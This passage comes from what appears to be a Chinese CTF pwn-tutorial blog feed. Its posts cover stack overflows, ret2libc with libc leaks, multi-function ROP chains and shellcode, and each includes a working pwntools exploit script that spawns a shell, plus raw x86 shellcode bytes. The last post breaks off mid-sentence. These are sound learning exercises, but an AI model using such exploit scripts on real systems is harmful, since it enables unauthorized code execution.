= <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span> , log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mprotect_addr = <span class="hljs-number">0x0806ED40</span><br>pop3_ret = <span class="hljs-number">0x806fcc8</span><br>shellcode = asm(shellcraft.sh())<br>target = <span class="hljs-number">0x80ea000</span><br>binsh_addr = <span class="hljs-number">0x80ec000</span><br><br>payload =  <span class="hljs-number">0x2D</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(mprotect_addr) + p32(pop3_ret)<br>payload += p32(target) + p32(<span class="hljs-number">0x3000</span>) + p32(<span class="hljs-number">0x7</span>)<br>payload += p32(read_addr) + p32(pop3_ret)<br>payload += p32(<span class="hljs-number">0</span>) + p32(binsh_addr) + p32(<span class="hljs-built_in">len</span>(shellcode))<br>payload += p32(binsh_addr)<br><br>p.sendline(payload)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>BUUCTF刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mprotect</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用动态链接动态泄露system地址并利用</title>
    <link href="/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/"/>
    <url>/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="已知libc库的情况"><a href="#已知libc库的情况" class="headerlink" title="已知libc库的情况"></a>已知libc库的情况</h2><p><strong>在动态编译的程序中，如果没有对system函数的直接调用，在plt中就不会存在system函数，也就是不能直接知道system函数的地址</strong><br><strong>在解决动态编译的二进制文件之前，需要了解动态链接的基础知识，这个过程叫作lzy-binding。程序对外部函数的调用要求在生成可执行文件时将外部函数链接到程序中链接的方式分为静态链接和动态链接。静态链接得到的可执行文件包含外部函数的全部代码。动态链接得到的可执行文件不包含外部函数的代码，而是在运行时将动态链接库(若干外部函数的集合)加载到内存的某个位置，在发生调用时再去链接库定位所需的函数。</strong></p><p><strong>这里通过几个简单的概念和过程的分析来说明整个过程。</strong></p><ol><li><strong>GOT。GOT是全局偏移量表(Global0fset Table)，用于存储外部函数在内存中的确切地址。GOT存储在数据段(DataSegment)内，可以在程序运行过程中被修改。</strong></li><li><strong>PIT是程序链接表(Procedure Linkage Table)，用来存储外部函数的人口点(entry),换言之，程序会到 PLT 中寻找外部函数的地址。PLT存储在代码段(CodeSegment)内，在运行之前就已经确定并目不会被修改。</strong></li></ol><p><strong>简单来讲，GOT是个数据表，存储的是外部函数的地址，具有读写权限(在FULLRELRO 保护机制开启的时候，没有读写权限):PLT是外部函数的人口表，存储的是每个外部函数的代码，具有执行权限</strong></p><p><strong>当程序在第一次运行的时候，会进入已被转载进内存中的动态链接库中查找对应的函数和地址，并把函数的地址放到got表中，将got表的地址数据映射为plt表的表项；在程序二次运行的时候，就不用再重新查找函数地址，而是直接通过plt表找到got表中函数的地址，从而执行函数的功能了。</strong><br><strong>在首次调用导出函数时，由于未知函数真正地址（这时表现为xxx@plt），去访问plt表中该函数所在的项（为一段代码，三条指令如上图所示），之后去访问GOT表，又跳到PLT[0]的中（代码段）调用函数_dl_runtime_resolve去获取真正的函数地址并修改对应的GOT表项</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348465.png"><br><strong>还有几点需要注意</strong></p><ol><li><strong>GOT[0] 是.dynamic段的装载地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息;</strong></li><li><strong>GOT[1] 是动态链接器的标识link_map的地址;</strong></li><li><strong>GOT[2] 包含动态链接器的延迟绑定代码_dl_runtime_resolve的入口点，用于得到真正的函数地址，回写到对应的got表中;</strong></li><li><strong>从 GOT[3] 开始就是函数的地址。</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348896.png"></li></ol><p><strong>对于任意两个函数的偏移是固定的，我们可以根据这个来做题，我们需要泄露一个函数地址，根据偏移来计算基地址，这样就能得到我们想要的地址</strong><br><strong>用一道例题来具体说明一下</strong><br>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc3">附件下载</a><br><strong>首先查看保护</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349307.png"><br><strong>地址随机化，NX开启</strong><br><strong>IDA反编译，没有发现后门函数，所以我们需要调用动态链接库里面的system来getshell</strong><br><strong>第一步：先泄露函数的一个地址</strong><br><strong>我们发现了栈溢出漏洞和put输出函数，那么我们就可以根据这个函数泄露地址</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349095.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2libc3&quot;)<br>gdb.attach(p,&quot;b *0x0804854C&quot;)<br>elf = ELF(&quot;./ret2libc3&quot;)<br>libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)<br><br>gets_got = elf.got[&quot;gets&quot;]<br>puts_plt = elf.plt[&quot;puts&quot;]<br>main_addr = 0x0804854E<br>p.recvuntil(&quot;ret2libc3\n&quot;)<br>payload1 = &quot;a&quot; * 0x108 + p32(1)<br>payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)<br>p.sendline(payload1)<br></code></pre></td></tr></table></figure><p><strong>根据EXP我们可以看到，通过调用put函数来打印got表中gets的地址，这样gets的地址就泄露成功了</strong><br><strong>第二步:计算偏移</strong><br><strong>我们泄露了gets函数的地址,那么根据它的偏移,就能得到基地址.base_addr&#x3D; 泄露地址 - 减去偏移</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs [python]">leak_addr = u32(p.recv(4))<br>libc_base = leak_addr - libc.symbols[&quot;gets&quot;]<br>libc.address = libc_base<br>log.success(&quot;libc_base:&quot; + hex(libc.address))<br></code></pre></td></tr></table></figure><p><strong>这里的libc.symbosl[‘’]在设置基地址之前得到的是偏移值,在设置基地址之后得到的是实际地址值</strong><br><strong>第三步:攻击</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs [python]">system = libc.symbols[&quot;system&quot;] #得到实际地址值<br>binsh = libc.search(&quot;/bin/sh&quot;).next() #搜索字符串，返回地址<br>p.recvuntil(&quot;ret2libc3\n&quot;)<br>payload2 = &quot;a&quot; * 0x108 + p32(1)<br>payload2 += p32(system) + p32(1) + p32(binsh)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>这样一个已知动态链接库的题就写好了,说到这肯定想问,那要是未知呢?别急接着往下看</strong></p><h2 id="未知动态链接库"><a href="#未知动态链接库" class="headerlink" title="未知动态链接库"></a>未知动态链接库</h2><p><strong>对于未知动态链接库,做题方式和已知链接库是大同小异的,无非是确定libc库是什么版本,我们来看一下怎么确定</strong><br><strong>在我现在学习中,有三种方法(实际肯定不止三种,使用自己觉得好用的就行)</strong></p><ol><li>在 github上有个 libc-database 项目，可以使用项目上的方法找出对应版本。</li><li>在网站 <a href="https://libc.nullbyte.cat/">https://libc.nullbyte.cat/</a> 上输入对应的函数名和地址找到 1ibc 版本。</li><li>使用python库libcsearcher</li></ol><p><strong>这里我们说一下第三种</strong></p><ol><li><strong>安装</strong> <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/lieanu/LibcSearcher.git<br><span class="hljs-keyword">cd</span> LibcSearcher<br><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> develop<br></code></pre></td></tr></table></figure></li><li><strong>基本使用</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs [python]">libc = LibcSearcher(&quot;func&quot;,gets_real_addr)             #寻找匹配的libc版本<br>libcbase = gets_real_addr – obj.dump(&quot;func&quot;)            #确定基地址<br>system_addr = libcbase + obj.dump(&quot;system&quot;)            #system 偏移<br>bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)         #/bin/sh 偏移<br><br><br></code></pre></td></tr></table></figure>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc</a><br><strong>普通栈溢出</strong><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349927.png"><br><strong>这里距离栈底为0x14个字节，但是按照14个字节编写会报错，我们使用cyclic的方法判断溢出，发现距离栈底为0x1c个字节</strong><br><strong>直接上脚本</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>from LibcSearcher import *<br>ret2libc = ELF(&#x27;./1&#x27;)<br>p = process(&#x27;./1&#x27;)<br>p.recvuntil(&#x27;is&#x27;)<br>binsh_addr = int(p.recvuntil(&#x27;\n&#x27; , drop=True) , 16)<br>p.recvuntil(&#x27;is&#x27;)<br>puts_addr = int(p.recvuntil(&#x27;\n&#x27; , drop = True) , 16)<br>libc = LibcSearcher(&#x27;puts&#x27; , puts_addr)<br>base_addr = puts_addr - libc.dump(&#x27;puts&#x27;)<br>system_addr = base_addr + libc.dump(&#x27;system&#x27;)<br>payload = 32 * b&#x27;a&#x27;  + p32(system_addr) + p32(1) + p32(binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><strong>做好使用python3运行，别问我怎么知道的~~~~</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写多个函数的ROP链</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>我们已经学会了编写单个和两个简单函数的ROP链，在这里我们说一下，编写ROP链多个需要注意的问题</strong><br><strong>之前我们在学习两个函数的ROP时，编写了这样的payload</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339706.png"><br><strong>我们当时没有考虑，参数冲突和栈溢出大小，现在我们来说一说</strong><br><strong>举个例子，如果我们上次学习的两个函数的ROP中没有gets函数，而是read函数我们怎么办，read函数有三个参数，如果我们要像以前一样构建payload，那么read的第二个参数，就会和system的第一个参数冲突，导致无法将system 的第一个参数放在栈上，在编写多个函数的ROP中会遇见这样的问题，如何解决呢？</strong></p><hr><p><strong>我们需要用到某个地址上的代码，这种代码的基本形式为pop*n + ret</strong><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240616165524944-784500429.png"><br><strong>运用这些命令就能把参数弹出，有几个参数就用几个pop命令，这里可以使用ROPgadget库来查找这些命令</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339232.png"><br><strong>这样我们就可以对上一次学的’编写两个函数的ROP进行改变，使其变得更合理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2libc2&quot;)<br>elf = ELF(&quot;./ret2libc2&quot;)<br>&quot;&quot;&quot;<br>ROPgadget --binary ./ret2libc2 --only &quot;pop|ret&quot;<br>Gadgets information<br>============================================================<br>0x0804861b : pop ebp ; ret<br>0x08048618 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0804839d : pop ebx ; ret<br>0x0804861a : pop edi ; pop ebp ; ret<br>0x08048619 : pop esi ; pop edi ; pop ebp ; ret<br>0x08048386 : ret<br>0x0804848e : ret 0xeac1<br><br>Unique gadgets found: 7<br>&quot;&quot;&quot;<br><br>system = elf.plt[&quot;system&quot;]<br>gets = elf.plt[&quot;gets&quot;]<br>cmd = &quot;/bin/sh&quot;<br>bss_addr = 0x0804A200<br>pop1_ret = 0x0804861b<br>p.recvuntil(&quot;ret2libc2\n&quot;)<br>payload = &quot;a&quot; * 0x108 + p32(1)<br>payload += p32(gets) + p32(pop1_ret) + p32(bss_addr)<br>payload += p32(system) + p32(pop1_ret) + p32(bss_addr)<br>p.sendline(payload)<br>p.sendline(cmd)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>这里看一下payload，栈溢出之后控制返回地址为gets，gets的返回地址为pop1_ret，gets的参数的bss段一个地址，在执行完gets后返回pop1_ret执行pop命令使gets的参数出栈，然后执行ret（pop eip）命令，控制EIP为system地址，system也是相同原理</strong></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写两个函数的ROP链</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>学会了编写单个ROP链，今天就进阶一下，学编写俩个函数的ROP链。通过一道例题我们直接上手</strong></p><p>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc2">附件下载</a><br><strong>首先我们查看保护</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340349.png"></p><p><strong>IDA反编译发现栈溢出</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340701.png"><br><strong>但是没发现&#x2F;bin&#x2F;sh,这是我们就无从下手了，我们要想一个办法创造&#x2F;bin&#x2F;sh这个字符串，我们发现题目有gets函数，那么我们能不能通过gets输入&#x2F;bin&#x2F;sh这个字符串呢，我们来验证一下</strong><br><strong>先通过栈溢出把返回地址覆盖为，gets函数，通过我们以前的学习，我们知道，和gets栈向上两个字就是gets的参数，也即是我们输入参数的地址，这点不理解的可以查一下gets这个函数，我们就不展开了。我们再控制gets的返回地址为system，和system的参数我们不就实现了进入shell了吗，payload如下</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182340274.png"><br><strong>对于这里的bss段，可以在网上阅读一下相关知识，这样我们是不是就控制了程序进入shell，大家可以仔细揣摩一下，理解了编写脚本就很简单</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&quot;./ret2libc2&quot;)<br>elf = ELF(&quot;./ret2libc2&quot;)<br>system = elf.plt[&quot;system&quot;]<br>gets = elf.plt[&quot;gets&quot;]<br>cmd = &quot;/bin/sh&quot;<br>bss_addr = 0x0804A200<br>p.recvuntil(&quot;ret2libc2\n&quot;)<br>payload = &quot;a&quot; * 0x108 + &quot;junk&quot;<br>payload += p32(gets) + p32(system) + p32(bss_addr) + p32(bss_addr)<br>p.sendline(payload)<br>p.sendline(cmd)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写单个函数的ROP链</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是ROP链"><a href="#什么是ROP链" class="headerlink" title="什么是ROP链"></a>什么是ROP链</h2><p><strong>在我初识栈溢出那篇博客已经详细的讲了函数的调用过程（基于X86框架），不了解的可以看一下，没有这个理论基础，是学不好ROP的。现在我们说一下什么是ROP</strong>。</p><p><strong>ROP链就是通过返回地址的修改来完成的编程，调用特定的函数的一种编程模式。我们可以联想一下你做的最简单的栈溢出的题，返回地址覆盖system（&#x2F;bin&#x2F;sh）。这种也是一种ROP链，只是最简单的一种，所以说ROP也没有那么高端，说白了就是控制返回地址，控制参数。这篇我们来讲一下怎么控制参数</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338766.png"><br><strong>这是一个main函数调用system（&#x2F;bin&#x2F;sh)的栈分布，把func函数的返回地址覆盖为system的地址，这时候system就会作为一个新的函数进入函数内部，开辟栈帧，执行‘push edp；mov edp，esp；sub esp，0x ’。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338135.png"></p><p><strong>根据我们学习函数调用的理论知识，我们可以知道，这时候对于system函数，a就是它的返回地址，b就是它的参数，所以就可以编写脚本控制b的内容来实现控制参数的传入，下面来小试牛刀</strong></p><p>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc1">附件下载</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338180.png"></p><p><strong>查看保护，开了地址随机化，开了NX，那我们就不能用Shellcode了，IDA反编译一下，看看怎么个事</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182338789.png"></p><p><strong>非常简单的栈溢出，但是没有发现后门函数，所以我们覆盖返回地址为system，传入变量&#x2F;bin&#x2F;sh，shift+F12打开string发现&#x2F;bin&#x2F;sh ，直接编写脚本</strong></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182339306.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&#x27;./ret2libc1&#x27;)<br>elf = ELF(&#x27;./ret2libc1&#x27;)<br>system_addr = elf.plt[&#x27;system&#x27;]<br>binsh_addr = 0x0804A028<br>p.recvuntil(&#x27;ret2libc1\n&#x27;)<br>payload = 0x108 * b&#x27;a&#x27; + p32(1) + p32(system_addr) + p32(1) + p32(binsh_addr)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode</title>
    <link href="/2024/07/18/Shellcode/"/>
    <url>/2024/07/18/Shellcode/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是Shellcode"><a href="#什么是Shellcode" class="headerlink" title="什么是Shellcode"></a>什么是Shellcode</h2><p><strong>Shellcode指的是用来完成某个功能的汇编代码，常用的功能就是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要要求对应的二进制文件没有开启NX保护。利用ret_address返回Shellcode处执行</strong></p><h2 id="怎么生成Shellcode"><a href="#怎么生成Shellcode" class="headerlink" title="怎么生成Shellcode"></a>怎么生成Shellcode</h2><p><strong>Shellcode的生成方法通常有以下几种：</strong></p><ol><li>在pwntools中由shellcraft模块生成</li><li>在<a href="https://www.exploit-db.com/shellcodes/">https://www.exploit-db.com/shellcodes/</a>网站中根据平台和系统的位数获取</li><li>通过Metasploit生成</li></ol><h3 id="1、根据pwntools生成Shellcode"><a href="#1、根据pwntools生成Shellcode" class="headerlink" title="1、根据pwntools生成Shellcode"></a>1、根据pwntools生成Shellcode</h3><p>例题：<a href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode">附件下载</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182336382.png"><br>查看保护没有开NX，可以用Shellcode<br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407190000793.png"><br>IDA反编译发现栈溢出，直接用Shellcode覆盖main_addr地址控制程序流</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>context.arch = &quot;i386&quot;<br>p = process(&#x27;./ret2shellcode&#x27;)<br>p.recvuntil(&quot;ret2shellcode&quot;)<br>target = int(p.recvuntile(&quot;\n&quot;,drop = true) , 16)<br>sc = asm(shellcraft.sh())<br>payload = sc.ljust(0x108 ,&#x27;\x00&#x27;) + p32(1) + p32(target)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>解释：target &#x3D; int(p.recvuntile(“\n”,drop &#x3D; true) , 16)接收直到换行符，并且去除换行符，转换为16进制</strong></p><h2 id="2、Shellcode进阶"><a href="#2、Shellcode进阶" class="headerlink" title="2、Shellcode进阶"></a>2、Shellcode进阶</h2><p>例题：<a href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337778.png"><br><strong>没有开NX保护，可以使用Shellccode</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182337746.png"><br><strong>发现溢出十八个字节，非常小，所以用pwntools生成的Shellcode长度太长，这里需要用gadget来控制EIP的位置，跳转到Shellcode的初始地址</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&#x27;./b0verfl0w&#x27;)<br><br>shellcode_x86 = &#x27;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&#x27;<br>sub_esp_jmp = asm(&#x27;sub esp , 0x28;jmp esp&#x27;)<br>jmp_esp = 0x08048504<br>payload = shellcode_x86.ljust(0x24 , &#x27;a&#x27;) +  p32(jmp_esp) + sub_esp_jmp<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>从payload起始地址开始构造Shellcode，之后调整esp到Shellcode起始位置</strong>、</p><blockquote><p>为什么要用jmp_esp而不是直接用Shellcode覆盖返回地址？<br>当pop main_addr后esp在main_上边，直接执行sub_esp_jmp在栈外执行，会异常，所以我们要把EIP调整到栈内再把EIP控制到sub_esp_jmp这样就没有问题了</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识栈溢出</title>
    <link href="/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="认识栈结构"><a href="#认识栈结构" class="headerlink" title="认识栈结构"></a>认识栈结构</h2><p><strong>栈这种结构学过数据结构的都知道，是一种先进后出的结构，类似于子弹放进弹夹一样，先放进的子弹最后打出。</strong></p><h2 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h2><p><strong>这个知识是整个栈方面的关键知识，我在大一的时候学pwn怎么也学不会，就是忽略了对基础知识的学习，直接学漏洞，一直搞不清怎么回事，非常郁闷。现在详细总结一下函数调用过程，以X86系统为例</strong></p><ol><li><p>压入参数<br><strong>根据调用约定压入参数，main函数作为调用者，首先将fun的参数a,b…压栈。栈是向下生长的，先压入的参数靠近栈顶esp，后压入的靠近栈底edp</strong></p></li><li><p>返回地址压入<br><strong>fun函数调用完成，程序需要返回源地址继续执行程序，那么我们就去要保存调用函数下一句的地址，把它压入栈中，以便我们恢复原程序继续执行</strong></p></li><li><p>fun函数运行<br><strong>fun函数运行会给自己再开辟一个栈，这个栈的栈底就是上个栈的栈顶，因为当调用函数时，执行call命令，会执行这几条汇编‘push edp；mov edp ，esp；sub esp，0x ’这句话可以画图来体会一下。push edp；是为了保存调用函数的栈帧，调用函数结束后要恢复原函数的edp，esp。mov edp ，esp；把esp的值赋值给edp，这样就把新栈帧的栈底确定了。sub esp ，0x，这句话为栈开辟空间，esp就确定了，完成一个新栈开辟</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341420.png"></p></li><li><p>fun函数返回<br><strong>当函数运行完成之后，函数这么返回呢？函数一般会执行‘leave；ret；’这句话什么含义，就是‘mov esp ，edp；pop edp；pop eip’ 我们来解读一下，首先把栈顶移动到栈底，相当于恢复栈顶，仔细想一想，是不是fun调用的时候，把edp移动到esp。然后pop edp 把栈中压入的main_edp弹出赋值给edp，这样我们就恢复了edp，然后再pop eip，把压入的main_addr弹出赋值给eip程序控制流就有回到了call的下一句</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341909.png"></p></li></ol><h3 id="函数调用过程中涉及操作指令"><a href="#函数调用过程中涉及操作指令" class="headerlink" title="函数调用过程中涉及操作指令"></a>函数调用过程中涉及操作指令</h3><ol><li><strong>压栈(push):栈顶指针esp减小4字节;以字节为单位将寄存器数据(4字节，不足补0)压入堆栈，从高到低依次将数据存人esp-1、esp-2、esp-3、esp-4指向的地址单元。</strong></li><li><strong>出栈(pop):栈顶指针esp指向的栈中数据被取回寄存器;栈顶指针esp增加4字节。push和pop指令在不同系统上运行时稍有不同，在64位系统中变化的大小是8字节，在32位系统中变化的大小是4字节。</strong></li><li><strong>调用(ca11):将当前的指令指针eip(该指针指向ca11指令后的下条指令)压入堆栈，以返回时能恢复执行下条指令。然后，设置eip指向被调函数的开始处，以跳转到被调函数的入口地址处执行。</strong></li><li><strong>离开(1eave):恢复主调函数的栈帧以准备返回，它等价于以下指令序列:mov esp，ebp(恢复原esp值，指向被调函数栈帧开始处); pop ebp(恢复原 ebp 